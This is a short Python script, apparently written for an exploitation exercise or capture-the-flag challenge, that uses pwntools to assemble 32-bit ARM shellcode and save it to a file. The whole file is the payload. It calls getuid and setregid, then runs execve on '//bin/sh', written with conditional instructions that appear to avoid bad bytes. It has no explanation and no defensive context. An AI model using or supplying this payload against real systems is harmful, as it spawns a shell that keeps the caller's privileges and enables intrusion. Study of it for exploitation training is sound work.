#!/usr/bin/env python3

from pwn import *
from pwn import asm, context, gdb, p32, process

context.arch = "arm"
context.bits = "32"

shellcode = asm(
    """
eorvc   r7, r7
eorvc   r7, 50
svcvc   1
eorvc   r1, r1
eorvc   r1, r0
eorvc   r7, r7
eorvc   r7, 71
svcvc   1
eorvc   r1, r1
eorvc   r2, r2
eorvc   r7, r7
eorvc   r7, 11
subvc   r0, pc, #0
svcvc   1
binsh:
    .ascii "//bin/sh"
""",
    arch="arm",
)

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)
